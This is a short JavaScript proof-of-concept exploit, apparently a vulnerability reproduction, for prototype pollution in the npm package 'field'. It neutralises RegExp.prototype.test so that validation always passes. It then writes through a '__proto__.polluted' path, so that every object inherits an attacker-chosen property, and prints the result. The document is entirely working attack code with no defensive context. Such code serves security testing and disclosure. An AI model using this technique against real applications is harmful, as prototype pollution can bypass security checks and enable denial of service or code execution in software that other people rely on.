RegExp.prototype.test = () => true;
console.log({}.polluted);
const field = require('field');
const obj = {};
field.set(obj, '__proto__.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');